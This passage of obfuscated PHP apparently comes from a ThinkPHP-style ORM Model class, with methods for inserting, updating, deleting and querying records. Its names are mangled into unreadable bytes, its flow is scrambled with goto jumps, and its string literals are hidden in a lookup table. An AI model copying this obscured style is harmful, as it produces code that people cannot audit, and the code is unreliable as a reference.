($BåÕ¦ƒ”Ä¡[$cÕ¾©×­Õë[36]]) { $this->fields[$cÕ¾©×­Õë[239]] = $eªßó‚ ˜; if ($BåÕ¦ƒ”Ä¡[$cÕ¾©×­Õë[39]]) { $this->fields[$cÕ¾©×­Õë[238]] = !0; } } } $this->fields[$cÕ¾©×­Õë[240]] = $AÊÒ¬‡¾ˆé; if (think_config($cÕ¾©×­Õë[236])) { $this->fields[$cÕ¾©×­Õë[237]] = think_config($cÕ¾©×­Õë[236]); } goto FÇÖÏ†ˆ¥ï; F±æàÛ‘ƒŞ: if (!$BòÀÄï½ˆÆ) { return !1; } $this->fields = array_keys($BòÀÄï½ˆÆ); $this->fields[$cÕ¾©×­Õë[238]] = !1; goto EÁàÏÁÜ‘”; f¢Ãî¶›Æ‘: } public function switchModel($B…Ö¶¹ÒÅ¢, $BğˆåÈ¶µŸ = array()) { $C‹¼“•Ç =& $_SERVER[í…¶]; $Eè½Æ÷ëÈƒ = ucwords(strtolower($B…Ö¶¹ÒÅ¢)) . $C‹¼“•Ç[241]; if (!class_exists($Eè½Æ÷ëÈƒ)) { think_exception($Eè½Æ÷ëÈƒ . think_lang($C‹¼“•Ç[242])); } $this->_extModel = new $Eè½Æ÷ëÈƒ($this->name); if (!empty($BğˆåÈ¶µŸ)) { foreach ($BğˆåÈ¶µŸ as $dƒ‰ÍÄˆİÃ) { $this->_extModel->setProperty($dƒ‰ÍÄˆİÃ, $this->{$dƒ‰ÍÄˆİÃ}); } } return $this->_extModel; } public function __set($BÃ¦„ÉªĞ, $dìäéëé§¥) { $this->data[$BÃ¦„ÉªĞ] = $dìäéëé§¥; } public function __get($bÏ¶˜ªÑ—) { return isset($this->data[$bÏ¶˜ªÑ—]) ? $this->data[$bÏ¶˜ªÑ—] : null; } public function __isset($b•ñ—¤µÚ) { return isset($this->data[$b•ñ—¤µÚ]); } public function __unset($Dˆ—‹¡Ë´ã) { unset($this->data[$Dˆ—‹¡Ë´ã]); } public function __call($f‘ò“ˆ”ï, $Aâ—®‹ˆŒ©) { $A…¢Í¥ÄàŠ =& $_SERVER[í…¶]; if (in_array(strtolower($f‘ò“ˆ”ï), $this->methods, !0)) { $this->options[strtolower($f‘ò“ˆ”ï)] = $Aâ—®‹ˆŒ©[0]; return $this; } elseif (in_array(strtolower($f‘ò“ˆ”ï), array($A…¢Í¥ÄàŠ[243], $A…¢Í¥ÄàŠ[244], $A…¢Í¥ÄàŠ[245], $A…¢Í¥ÄàŠ[246], $A…¢Í¥ÄàŠ[247]), !0)) { $D¬½À·˜ĞÄ = isset($Aâ—®‹ˆŒ©[0]) ? $Aâ—®‹ˆŒ©[0] : $A…¢Í¥ÄàŠ[176]; $D¬½À·˜ĞÄ = $this->db->parseKey($D¬½À·˜ĞÄ); return $this->getField(strtoupper($f‘ò“ˆ”ï) . $A…¢Í¥ÄàŠ[248] . $D¬½À·˜ĞÄ . $A…¢Í¥ÄàŠ[249] . $f‘ò“ˆ”ï, $A…¢Í¥ÄàŠ[243]); } elseif (strtolower(substr($f‘ò“ˆ”ï, 0, 5)) == $A…¢Í¥ÄàŠ[250]) { $D¬½À·˜ĞÄ = think_parse_name(substr($f‘ò“ˆ”ï, 5)); $FÒ¥ˆ†‡®ê[$D¬½À·˜ĞÄ] = $Aâ—®‹ˆŒ©[0]; return $this->where($FÒ¥ˆ†‡®ê)->find(); } elseif (strtolower(substr($f‘ò“ˆ”ï, 0, 10)) == $A…¢Í¥ÄàŠ[251]) { $eÜ¢ë¨ƒÊĞ = think_parse_name(substr($f‘ò“ˆ”ï, 10)); $FÒ¥ˆ†‡®ê[$eÜ¢ë¨ƒÊĞ] = $Aâ—®‹ˆŒ©[0]; return $this->where($FÒ¥ˆ†‡®ê)->getField($Aâ—®‹ˆŒ©[1]); } elseif (isset($this->_scope[$f‘ò“ˆ”ï])) { return $this->scope($f‘ò“ˆ”ï, $Aâ—®‹ˆŒ©[0]); } elseif (method_exists($this, $f‘ò“ˆ”ï)) { array_unshift($Aâ—®‹ˆŒ©, $f‘ò“ˆ”ï); return call_user_func_array(array($this, $A…¢Í¥ÄàŠ[252]), $Aâ—®‹ˆŒ©); } else { return call_user_func_array(array(parent, $f‘ò“ˆ”ï), $Aâ—®‹ˆŒ©); } } protected function call() { goto bºì¾ÕÛÕ; F¾éÏôíò: $Bµ²íÚ‰ã = call_user_func_array(array($this, $B•–¥ìÜ«), $a³˜°‰ÛÑ¯); if (method_exists($this, $BÅÕŒ–™½ˆ[256])) { $b«•Äª“Âé = call_user_func_array(array($this, $BÅÕŒ–™½ˆ[257]), array($f·İĞÍ×±É, $a³˜°‰ÛÑ¯, $Bµ²íÚ‰ã)); if ($b«•Äª“Âé) { return $b«•Äª“Âé; } } return $Bµ²íÚ‰ã; goto F‚—¶»ˆ‰; DÓî¯Éõ°ç: $f·İĞÍ×±É = $B•–¥ìÜ«; if (is_array($B•–¥ìÜ«)) { $f·İĞÍ×±É = $B•–¥ìÜ«[1]; $B•–¥ìÜ« = $B•–¥ìÜ«[0]; } $eµñ„¾› = count($a³˜°‰ÛÑ¯) - 1; goto E¹¡Ñâ‚; bºì¾ÕÛÕ: $BÅÕŒ–™½ˆ =& $_SERVER[í…¶]; $a³˜°‰ÛÑ¯ = func_get_args(); $B•–¥ìÜ« = array_shift($a³˜°‰ÛÑ¯); goto DÓî¯Éõ°ç; E¹¡Ñâ‚: if (isset($a³˜°‰ÛÑ¯[$eµñ„¾›]) && $a³˜°‰ÛÑ¯[$eµñ„¾›] === $B•–¥ìÜ«) { think_exception(__CLASS__ . $BÅÕŒ–™½ˆ[4] . $B•–¥ìÜ« . think_lang($BÅÕŒ–™½ˆ[253])); return; } $a³˜°‰ÛÑ¯[] = $B•–¥ìÜ«; if (method_exists($this, $BÅÕŒ–™½ˆ[254])) { $b«•Äª“Âé = call_user_func_array(array($this, $BÅÕŒ–™½ˆ[255]), array($f·İĞÍ×±É, $a³˜°‰ÛÑ¯)); if (!is_null($b«•Äª“Âé) && $b«•Äª“Âé !== !1) { return $b«•Äª“Âé; } } goto F¾éÏôíò; F‚—¶»ˆ‰: } protected function _initialize() { } protected function _facade($b¿¾…•´æÂ) { $fÍê…Ñ¤« =& $_SERVER[í…¶]; if (!empty($this->fields)) { foreach ($b¿¾…•´æÂ as $däìŒ°­¤ => $D—šãĞêŠ®) { if (!in_array($däìŒ°­¤, $this->fields, !0)) { unset($b¿¾…•´æÂ[$däìŒ°­¤]); } elseif (is_scalar($D—šãĞêŠ®)) { $this->_parseType($b¿¾…•´æÂ, $däìŒ°­¤); } } } if (!empty($this->options[$fÍê…Ñ¤«[258]])) { $b¿¾…•´æÂ = array_map($this->options[$fÍê…Ñ¤«[258]], $b¿¾…•´æÂ); unset($this->options[$fÍê…Ñ¤«[258]]); } $this->_beforeWrite($b¿¾…•´æÂ); return $b¿¾…•´æÂ; } protected function _beforeWrite(&$BíÓî¼æ‘) { } public function add($c”×©Ã»ˆ = '', $aƒÒŒ¦§®› = array(), $Fê •’´ò‚ = false) { goto DÇ×¢Ã’³Ú; DÇ×¢Ã’³Ú: if (empty($c”×©Ã»ˆ)) { if (!empty($this->data)) { $c”×©Ã»ˆ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[í…¶][259]); return !1; } } $aƒÒŒ¦§®› = $this->_parseOptions($aƒÒŒ¦§®›); $c”×©Ã»ˆ = $this->_facade($c”×©Ã»ˆ); goto a¾˜ÀÄÍÅò; a¾˜ÀÄÍÅò: if (!1 === $this->_beforeInsert($c”×©Ã»ˆ, $aƒÒŒ¦§®›)) { return !1; } $d…ê²‚¯ï = $this->db->insert($c”×©Ã»ˆ, $aƒÒŒ¦§®›, $Fê •’´ò‚); if (!1 !== $d…ê²‚¯ï) { $D¶ï‘¬­„« = $this->getLastInsID(); if ($D¶ï‘¬­„«) { $c”×©Ã»ˆ[$this->getPk()] = $D¶ï‘¬­„«; $this->_after_insert($c”×©Ã»ˆ, $aƒÒŒ¦§®›); return $D¶ï‘¬­„«; } $this->_after_insert($c”×©Ã»ˆ, $aƒÒŒ¦§®›); } goto f¥‰°ì§¥˜; f¥‰°ì§¥˜: return $d…ê²‚¯ï; goto C˜¤Ú´ÚåÄ; C˜¤Ú´ÚåÄ: } protected function _beforeInsert(&$D‰ÑÊ…›å, $b›Çô¤µ™) { } protected function _after_insert($bØ¼“Ûöˆ, $DƒÓ¯Õ¹ä) { } public function addAll($b˜Âøªò…Ó, $fßöÁº£¤  = array(), $B¬·Ÿôí†  = false) { goto aëœõ¸Ş; AÒÕÄœ¾Á: foreach ($b˜Âøªò…Ó as $EÖâŒÔÇ» => $B¸é™µ¾ÃÕ) { $b˜Âøªò…Ó[$EÖâŒÔÇ»] = $this->_facade($B¸é™µ¾ÃÕ); } if (method_exists($this->db, $EãêòôŠİ[260])) { $aĞ±ê¥‘• = $this->db->insertAll($b˜Âøªò…Ó, $fßöÁº£¤ , $B¬·Ÿôí† ); } else { $this->startTrans(); foreach ($b˜Âøªò…Ó as $EÖâŒÔÇ» => $B¸é™µ¾ÃÕ) { $aĞ±ê¥‘• = $this->db->insert($B¸é™µ¾ÃÕ, $fßöÁº£¤ , $B¬·Ÿôí† ); } $this->commit(); } if (!1 !== $aĞ±ê¥‘•) { $DÛ½Ã‘š½¡ = $this->getLastInsID(); if ($DÛ½Ã‘š½¡) { return $DÛ½Ã‘š½¡; } } goto cä§§¹øêÅ; aëœõ¸Ş: $EãêòôŠİ =& $_SERVER[í…¶]; if (empty($b˜Âøªò…Ó)) { $this->error = think_lang($EãêòôŠİ[259]); return !1; } $fßöÁº£¤  = $this->_parseOptions($fßöÁº£¤ ); goto AÒÕÄœ¾Á; cä§§¹øêÅ: return $aĞ±ê¥‘•; goto e«éŞÛ÷Šß; e«éŞÛ÷Šß: } public function selectAdd($a†ˆÏøÅ„é = '', $CÇß”œ½í = '', $e‰¢ßÑóÉÖ = array()) { $bÂ™†‹Š¸Ò =& $_SERVER[í…¶]; $e‰¢ßÑóÉÖ = $this->_parseOptions($e‰¢ßÑóÉÖ); if (!1 === ($D÷É†È¨Ãİ = $this->db->selectInsert($a†ˆÏøÅ„é ? $a†ˆÏøÅ„é : $e‰¢ßÑóÉÖ[$bÂ™†‹Š¸Ò[261]], $CÇß”œ½í ? $CÇß”œ½í : $this->getTableName(), $e‰¢ßÑóÉÖ))) { $this->error = think_lang($bÂ™†‹Š¸Ò[262]); return !1; } else { return $D÷É†È¨Ãİ; } } public function save($aõğİã©¼ = '', $aî¯½„ˆ¿· = array()) { goto CÙâ¬×Ï®·; e††º§Ç¾æ: if (is_array($aî¯½„ˆ¿·[$câğŠÈóäà[263]]) && isset($aî¯½„ˆ¿·[$câğŠÈóäà[263]][$aŞ—õç¹å])) { $cñõËò©¶± = $aî¯½„ˆ¿·[$câğŠÈóäà[263]][$aŞ—õç¹å]; } if (!1 === $this->_beforeUpdate($aõğİã©¼, $aî¯½„ˆ¿·)) { return !1; } $e·±¬‚ÅÌ¨ = $this->db->update($aõğİã©¼, $aî¯½„ˆ¿·); goto bÉÖÃæ’œÒ; bÉÖÃæ’œÒ: if (!1 !== $e·±¬‚ÅÌ¨) { if (isset($cñõËò©¶±)) { $aõğİã©¼[$aŞ—õç¹å] = $cñõËò©¶±; } $this->_afterUpdate($aõğİã©¼, $aî¯½„ˆ¿·); } return $e·±¬‚ÅÌ¨; goto DÛ¢‡šˆêë; bÙ÷šˆ¥‹: $aî¯½„ˆ¿· = $this->_parseOptions($aî¯½„ˆ¿·); $aŞ—õç¹å = $this->getPk(); if (!isset($aî¯½„ˆ¿·[$câğŠÈóäà[263]])) { if (isset($aõğİã©¼[$aŞ—õç¹å])) { $b×ì¤¨˜Œ°[$aŞ—õç¹å] = $aõğİã©¼[$aŞ—õç¹å]; $aî¯½„ˆ¿·[$câğŠÈóäà[263]] = $b×ì¤¨˜Œ°; unset($aõğİã©¼[$aŞ—õç¹å]); } else { $this->error = think_lang($câğŠÈóäà[262]); return !1; } } goto e††º§Ç¾æ; CÙâ¬×Ï®·: $câğŠÈóäà =& $_SERVER[í…¶]; if (empty($aõğİã©¼)) { if (!empty($this->data)) { $aõğİã©¼ = $this->data; $this->data = array(); } else { $this->error = think_lang($câğŠÈóäà[259]); return !1; } } $aõğİã©¼ = $this->_facade($aõğİã©¼); goto bÙ÷šˆ¥‹; DÛ¢‡šˆêë: } protected function _beforeUpdate(&$AØäÉ“è, $däßÚõæ É) { } protected function _afterUpdate($FÒŞ„¶Ç–, $EØÁŒÙ¼Ò) { } public function delete($bÆÛ…Œù…œ = array()) { goto bã¹¶ØÏ»; c£À™ßÅî: if (is_numeric($bÆÛ…Œù…œ) || is_string($bÆÛ…Œù…œ)) { if (strpos($bÆÛ…Œù…œ, $B‘ä«í‚ã­[47])) { $CŠØÔä·¤¸[$aÏá­ƒÆï™] = array($B‘ä«í‚ã­[264], $bÆÛ…Œù…œ); } else { $CŠØÔä·¤¸[$aÏá­ƒÆï™] = $bÆÛ…Œù…œ; } $this->options[$B‘ä«í‚ã­[263]] = $CŠØÔä·¤¸; } $bÆÛ…Œù…œ = $this->_parseOptions(); if (is_array($bÆÛ…Œù…œ[$B‘ä«í‚ã­[263]]) && isset($bÆÛ…Œù…œ[$B‘ä«í‚ã­[263]][$aÏá­ƒÆï™])) { $EĞµÙŠï = $bÆÛ…Œù…œ[$B‘ä«í‚ã­[263]][$aÏá­ƒÆï™]; } goto Eó‚à•È”; Eó‚à•È”: $c¡â¼·åÍ = $this->db->delete($bÆÛ…Œù…œ); if (!1 !== $c¡â¼·åÍ) { $aÏ¡¡’“¯Á = array(); if (isset($EĞµÙŠï)) { $aÏ¡¡’“¯Á[$aÏá­ƒÆï™] = $EĞµÙŠï; } $this->_after_delete($aÏ¡¡’“¯Á, $bÆÛ…Œù…œ); } return $c¡â¼·åÍ; goto A‚İ†²§’; bã¹¶ØÏ»: $B‘ä«í‚ã­ =& $_SERVER[í…¶]; if (empty($bÆÛ…Œù…œ) && empty($this->options[$B‘ä«í‚ã­[263]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $aÏá­ƒÆï™ = $this->getPk(); goto c£À™ßÅî; A‚İ†²§’: } protected function _after_delete($A¨ô…†ËÀ, $eñ›Ü‰ø×) { } public function select($bØÎ¸Ó‰ªÎ = array()) { goto E¼‚©®ÛšÑ; d¥ùËÙ÷¯á: $E´„†éòòù = $this->db->select($bØÎ¸Ó‰ªÎ); if (!1 === $E´„†éòòù) { return !1; } if (empty($E´„†éòòù)) { return null; } goto D¹ÏšïŒõœ; D¹ÏšïŒõœ: $this->_afterSelect($E´„†éòòù, $bØÎ¸Ó‰ªÎ); return $E´„†éòòù; goto B§ë†ôÛÑ¢; E¼‚©®ÛšÑ: $fÖïïÒÁ¸½ =& $_SERVER[í…¶]; if (is_string($bØÎ¸Ó‰ªÎ) || is_numeric($bØÎ¸Ó‰ªÎ)) { $BÅÕˆ²Ø½§ = $this->getPk(); if (strpos($bØÎ¸Ó‰ªÎ, $fÖïïÒÁ¸½[47])) { $Eßãé„âè¸[$BÅÕˆ²Ø½§] = array($fÖïïÒÁ¸½[264], $bØÎ¸Ó‰ªÎ); } else { $Eßãé„âè¸[$BÅÕˆ²Ø½§] = $bØÎ¸Ó‰ªÎ; } $this->options[$fÖïïÒÁ¸½[263]] = $Eßãé„âè¸; } elseif (!1 === $bØÎ¸Ó‰ªÎ) { $bØÎ¸Ó‰ªÎ = $this->_parseOptions(); return $fÖïïÒÁ¸½[265] . $this->db->buildSelectSql($bØÎ¸Ó‰ªÎ) . $fÖïïÒÁ¸½[266]; } $bØÎ¸Ó‰ªÎ = $this->_parseOptions(); goto d¥ùËÙ÷¯á; B§ë†ôÛÑ¢: } protected function _afterSelect(&$fÇÆ×“‚¸Ï, $AÌÉ±˜ƒ™») { } public function buildSql($c¹Û»‹İ® = array()) { $FÜÙ¤…ß¡Ò =& $_SERVER[í…¶]; $c¹Û»‹İ® = $this->_parseOptions($c¹Û»‹İ®); return $FÜÙ¤…ß¡Ò[265] . $this->db->buildSelectSql($c¹Û»‹İ®) . $FÜÙ¤…ß¡Ò[266]; } public function optionsValue($Dé‹Ûæ­´¨ = null) { if (is_null($Dé‹Ûæ­´¨)) { return $this->options; } elseif (is_array($Dé‹Ûæ­´¨)) { $this->options = array_merge($this->options, $Dé‹Ûæ­´¨); } } protected function _parseOptions($eÖÊ³±ë– = array()) { goto c›ë×™ä‚; c›ë×™ä‚: $Dƒøº•˜ŠÔ =& $_SERVER[í…¶]; if (is_array($eÖÊ³±ë–)) { $eÖÊ³±ë– = array_merge($this->options, $eÖÊ³±ë–); } $this->options = array(); goto aÎ¬¡Ú’¦õ; d„è›¢†Ì: if (isset($eÖÊ³±ë–[$Dƒøº•˜ŠÔ[263]]) && is_array($eÖÊ³±ë–[$Dƒøº•˜ŠÔ[263]]) && !empty($EÎ³¶õĞØ±) && !isset($eÖÊ³±ë–[$Dƒøº•˜ŠÔ[270]]) && !isset($eÖÊ³±ë–[$Dƒøº•˜ŠÔ[267]])) { foreach ($eÖÊ³±ë–[$Dƒøº•˜ŠÔ[263]] as $A¡Ó®‘¸®¬ => $DĞø•ë´‚) { $A¡Ó®‘¸®¬ = trim($A¡Ó®‘¸®¬); if (in_array($A¡Ó®‘¸®¬, $EÎ³¶õĞØ±, !0)) { if (is_scalar($DĞø•ë´‚)) { $this->_parseType($eÖÊ³±ë–[$Dƒøº•˜ŠÔ[263]], $A¡Ó®‘¸®¬); } } elseif (!is_numeric($A¡Ó®‘¸®¬) && $Dƒøº•˜ŠÔ[70] != substr($A¡Ó®‘¸®¬, 0, 1) && !1 === strpos($A¡Ó®‘¸®¬, $Dƒøº•˜ŠÔ[91]) && !1 === strpos($A¡Ó®‘¸®¬, $Dƒøº•˜ŠÔ[248]) && !1 === strpos($A¡Ó®‘¸®¬, $Dƒøº•˜ŠÔ[271]) && !1 === strpos($A¡Ó®‘¸®¬, $Dƒøº•˜ŠÔ[272])) { unset($eÖÊ³±ë–[$Dƒøº•˜ŠÔ[263]][$A¡Ó®‘¸®¬]); } } } $this->_options_filter($eÖÊ³±ë–); return $eÖÊ³±ë–; goto E˜Ğ…¿¶ØÔ; aÎ¬¡Ú’¦õ: if (!isset($eÖÊ³±ë–[$Dƒøº•˜ŠÔ[267]])) { $eÖÊ³±ë–[$Dƒøº•˜ŠÔ[267]] = $this->getTableName(); $EÎ³¶õĞØ± = $this->fields; } else { $EÎ³¶õĞØ± = $this->getDbFields(); } if (!empty($eÖÊ³±ë–[$Dƒøº•˜ŠÔ[268]])) { $eÖÊ³±ë–[$Dƒøº•˜ŠÔ[267]] .= $Dƒøº•˜ŠÔ[50] . $eÖÊ³±ë–[$Dƒøº•˜ŠÔ[268]]; } $eÖÊ³±ë–[$Dƒøº•˜ŠÔ[269]] = $this->name; goto d„è›¢†Ì; E˜Ğ…¿¶ØÔ: } protected function _options_filter(&$Fã »¥½İ•) { } protected function _parseType(&$e›ÅÉ”“‰æ, $bÕÄğæŒùË) { $aÈÉ˜± =& $_SERVER[í…¶]; if (empty($this->options[$aÈÉ˜±[273]][$aÈÉ˜±[4] . $bÕÄğæŒùË])) { $D¼ä¹ÇœÚ® = strtolower($this->fields[$aÈÉ˜±[240]][$bÕÄğæŒùË]); if (!1 !== strpos($D¼ä¹ÇœÚ®, $aÈÉ˜±[274])) { } elseif (!1 === strpos($D¼ä¹ÇœÚ®, $aÈÉ˜±[275]) && !1 !== strpos($D¼ä¹ÇœÚ®, $aÈÉ˜±[276])) { $e›ÅÉ”“‰æ[$bÕÄğæŒùË] = intval($e›ÅÉ”“‰æ[$bÕÄğæŒùË]); } elseif (!1 !== strpos($D¼ä¹ÇœÚ®, $aÈÉ˜±[277]) || !1 !== strpos($D¼ä¹ÇœÚ®, $aÈÉ˜±[278])) { $e›ÅÉ”“‰æ[$bÕÄğæŒùË] = floatval($e›ÅÉ”“‰æ[$bÕÄğæŒùË]); } elseif (!1 !== strpos($D¼ä¹ÇœÚ®, $aÈÉ˜±[279])) { $e›ÅÉ”“‰æ[$bÕÄğæŒùË] = (bool) $e›ÅÉ”“‰æ[$bÕÄğæŒùË]; } } } public function find($C„³ˆÊÁÀÊ = array()) { goto BÈœ‘Ê‹‡µ; E÷‚¤Ø°é: if (!empty($this->options[$c¢ÎÅéÉÙÆ[281]])) { return $this->returnResult($this->data, $this->options[$c¢ÎÅéÉÙÆ[281]]); } return $this->data; goto Bí×À‚ß¼; f¸Ä‹ã°äĞ: if (empty($bó„Ÿ¶è)) { return null; } $this->data = $bó„Ÿ¶è[0]; $this->_afterFind($this->data, $C„³ˆÊÁÀÊ); goto E÷‚¤Ø°é; BÈœ‘Ê‹‡µ: $c¢ÎÅéÉÙÆ =& $_SERVER[í…¶]; if (is_numeric($C„³ˆÊÁÀÊ) || is_string($C„³ˆÊÁÀÊ)) { $B´ˆóé…®¿[$this->getPk()] = intval($C„³ˆÊÁÀÊ); $this->options[$c¢ÎÅéÉÙÆ[263]] = $B´ˆóé…®¿; } $this->options[$c¢ÎÅéÉÙÆ[280]] = 1; goto Fª•ÈÛ°Ø¼; Fª•ÈÛ°Ø¼: $C„³ˆÊÁÀÊ = $this->_parseOptions(); $bó„Ÿ¶è = $this->db->select($C„³ˆÊÁÀÊ); if (!1 === $bó„Ÿ¶è) { return !1; } goto f¸Ä‹ã°äĞ; Bí×À‚ß¼: } protected function _afterFind(&$E…§ñÑ¶«, $cÅè¿İğø) { } protected function returnResult($BµÁÒË—µŸ, $eã“Ö¯ó‹ = '') { $eà›Öí­¿• =& $_SERVER[í…¶]; if ($eã“Ö¯ó‹) { if (is_callable($eã“Ö¯ó‹)) { return call_user_func($eã“Ö¯ó‹, $BµÁÒË—µŸ); } switch (strtolower($eã“Ö¯ó‹)) { case $eà›Öí­¿•[282]: return json_encode($BµÁÒË—µŸ); case $eà›Öí­¿•[283]: return xml_encode($BµÁÒË—µŸ); } } return $BµÁÒË—µŸ; } public function parseFieldsMap($bŒÌºáŒÇÕ, $AÒ“‡™¥¾ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $Döåš­ ã => $eÂğêœ’ó) { if ($AÒ“‡™¥¾ == 1) { if (isset($bŒÌºáŒÇÕ[$eÂğêœ’ó])) { $bŒÌºáŒÇÕ[$Döåš­ ã] = $bŒÌºáŒÇÕ[$eÂğêœ’ó]; unset($bŒÌºáŒÇÕ[$eÂğêœ’ó]); } } else { if (isset($bŒÌºáŒÇÕ[$Döåš­ ã])) { $bŒÌºáŒÇÕ[$eÂğêœ’ó] = $bŒÌºáŒÇÕ[$Döåš­ ã]; unset($bŒÌºáŒÇÕ[$Döåš­ ã]); } } } } return $bŒÌºáŒÇÕ; } public function setField($EÉ¥â‰…Ò†, $a¿º—âÉà = '') { if (is_array($EÉ¥â‰…Ò†)) { $bÁ¹ŠÎƒ±  = $EÉ¥â‰…Ò†; } else { $bÁ¹ŠÎƒ± [$EÉ¥â‰…Ò†] = $a¿º—âÉà; } return $this->save($bÁ¹ŠÎƒ± ); } public function setAdd($e»„ó¼ÇöÊ, $DÂåˆØÚÖ = 1) { $E—Ğ½¹Óá÷ =& $_SERVER[í…¶]; $B¾áğ½²¾ = $e»„ó¼ÇöÊ . $E—Ğ½¹Óá÷[284] . $DÂåˆØÚÖ; if ($DÂåˆØÚÖ < 0) { $B¾áğ½²¾ = $e»„ó¼ÇöÊ . $DÂåˆØÚÖ; } return $this->setField($e»„ó¼ÇöÊ, array($E—Ğ½¹Óá÷[285], $B¾áğ½²¾)); } public function getField($a¢Ÿ¦Ë¼é, $d’ß˜–Ÿ¿ö = null) { $e‡”Ã’±§ =& $_SERVER[í…¶]; $EÍÈ‡ÕŞâ³[$e‡”Ã’±§[261]] = $a¢Ÿ¦Ë¼é; $EÍÈ‡ÕŞâ³ = $this->_parseOptions($EÍÈ‡ÕŞâ³); $a¢Ÿ¦Ë¼é = trim($a¢Ÿ¦Ë¼é); if (strpos($a¢Ÿ¦Ë¼é, $e‡”Ã’±§[47])) { if (!isset($EÍÈ‡ÕŞâ³[$e‡”Ã’±§[280]])) { $EÍÈ‡ÕŞâ³[$e‡”Ã’±§[280]] = is_numeric($d’ß˜–Ÿ¿ö) ? $d’ß˜–Ÿ¿ö : $e‡”Ã’±§[33]; } $fÚ±ÊÊ•ÅŠ = $this->db->select($EÍÈ‡ÕŞâ³); if (!empty($fÚ±ÊÊ•ÅŠ)) { goto a’ôèÕƒÂÒ; F»ÄÆí¯: foreach ($fÚ±ÊÊ•ÅŠ as $D·º¾áÜ¥ƒ) { $a›ñ·ñ¹Çô = $D·º¾áÜ¥ƒ[$EÇßéô½„Š]; if (2 == $A×Í˜ƒÆªÉ) { $D¢æˆæ££–[$a›ñ·ñ¹Çô] = $D·º¾áÜ¥ƒ[$F¤·×«å§]; } else { $D¢æˆæ££–[$a›ñ·ñ¹Çô] = is_string($d’ß˜–Ÿ¿ö) ? implode($d’ß˜–Ÿ¿ö, $D·º¾áÜ¥ƒ) : $D·º¾áÜ¥ƒ; } } return $D¢æˆæ££–; goto B§õ‹¼­§›; DÚâ©àÑ”Ï: $F¤·×«å§ = array_shift($a¢Ÿ¦Ë¼é); $D¢æˆæ££– = array(); $A×Í˜ƒÆªÉ = count($eÄˆƒ‡„óù); goto F»ÄÆí¯; a’ôèÕƒÂÒ: $eÄˆƒ‡„óù = explode($e‡”Ã’±§[47], $a¢Ÿ¦Ë¼é); $a¢Ÿ¦Ë¼é = array_keys($fÚ±ÊÊ•ÅŠ[0]); $EÇßéô½„Š = array_shift($a¢Ÿ¦Ë¼é); goto DÚâ©àÑ”Ï; B§õ‹¼­§›: } } else { if (!0 !== $d’ß˜–Ÿ¿ö) { $EÍÈ‡ÕŞâ³[$e‡”Ã’±§[280]] = is_numeric($d’ß˜–Ÿ¿ö) ? $d’ß˜–Ÿ¿ö : 1; } if ($d’ß˜–Ÿ¿ö === $e‡”Ã’±§[243]) { unset($EÍÈ‡ÕŞâ³[$e‡”Ã’±§[280]]); } $D·º¾áÜ¥ƒ = $this->db->select($EÍÈ‡ÕŞâ³); if (!empty($D·º¾áÜ¥ƒ)) { if ($d’ß˜–Ÿ¿ö === $e‡”Ã’±§[243]) { return reset($D·º¾áÜ¥ƒ[0]); } if (!0 !== $d’ß˜–Ÿ¿ö && 1 == $EÍÈ‡ÕŞâ³[$e‡”Ã’±§[280]]) { return reset($D·º¾áÜ¥ƒ[0]); } foreach ($D·º¾áÜ¥ƒ as $Bªğ£¶‹í‰) { $DŞ³¤ÌªÔÎ[] = $Bªğ£¶‹í‰[$a¢Ÿ¦Ë¼é]; } return $DŞ³¤ÌªÔÎ; } } return null; } public function create($A·ÒùĞ²Ò = '', $FÄŠ¦¨«–§ = '') { goto d¸ˆî…ÌÀ; d¸ˆî…ÌÀ: $F½º“‹†àˆ =& $_SERVER[í…¶]; if (empty($A·ÒùĞ²Ò)) { $A·ÒùĞ²Ò = $_POST; } elseif (is_object($A·ÒùĞ²Ò)) { $A·ÒùĞ²Ò = get_object_vars($A·ÒùĞ²Ò); } if (empty($A·ÒùĞ²Ò) || !is_array($A·ÒùĞ²Ò)) { $this->error = think_lang($F½º“‹†àˆ[259]); return !1; } goto Eá¯„ƒìã; C‹ÅÇÑÙ¸¼: return $A·ÒùĞ²Ò; goto Bêã—é³¸Ø; Eá¯„ƒìã: $A·ÒùĞ²Ò = $this->parseFieldsMap($A·ÒùĞ²Ò, 0); $FÄŠ¦¨«–§ = $FÄŠ¦¨«–§ ? $FÄŠ¦¨«–§ : (!empty($A·ÒùĞ²Ò[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$F½º“‹†àˆ[261]])) { $c‘ë›–Û = $this->options[$F½º“‹†àˆ[261]]; unset($this->options[$F½º“‹†àˆ[261]]); } elseif ($FÄŠ¦¨«–§ == THINK_MODEL_INSERT && isset($this->insertFields)) { $c‘ë›–Û = $this->insertFields; } elseif ($FÄŠ¦¨«–§ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $c‘ë›–Û = $this->updateFields; } goto Fİ‚¼º„–Œ; fÎ«ì£•œì: if ($this->autoCheckFields) { $c‘ë›–Û = $this->getDbFields(); foreach ($A·ÒùĞ²Ò as $A´¸ƒ”¾Ê => $Cƒ°·ŒŠ©‡) { if (!in_array($A´¸ƒ”¾Ê, $c‘ë›–Û)) { unset($A·ÒùĞ²Ò[$A´¸ƒ”¾Ê]); } elseif (MAGIC_QUOTES_GPC && is_string($Cƒ°·ŒŠ©‡)) { $A·ÒùĞ²Ò[$A´¸ƒ”¾Ê] = stripslashes($Cƒ°·ŒŠ©‡); } } } $this->autoOperation($A·ÒùĞ²Ò, $FÄŠ¦¨«–§); $this->data = $A·ÒùĞ²Ò; goto C‹ÅÇÑÙ¸¼; Fİ‚¼º„–Œ: if (isset($c‘ë›–Û)) { if (is_string($c‘ë›–Û)) { $c‘ë›–Û = explode($F½º“‹†àˆ[47], $c‘ë›–Û); } if (think_config($F½º“‹†àˆ[286])) { $c‘ë›–Û[] = think_config($F½º“‹†àˆ[287]); } foreach ($A·ÒùĞ²Ò as $A´¸ƒ”¾Ê => $Cƒ°·ŒŠ©‡) { if (!in_array($A´¸ƒ”¾Ê, $c‘ë›–Û)) { unset($A·ÒùĞ²Ò[$A´¸ƒ”¾Ê]); } } } if (!$this->autoValidation($A·ÒùĞ²Ò, $FÄŠ¦¨«–§)) { return !1; } if (!$this->autoCheckToken($A·ÒùĞ²Ò)) { $this->error = think_lang($F½º“‹†àˆ[288]); return !1; } goto fÎ«ì£•œì; Bêã—é³¸Ø: } public function 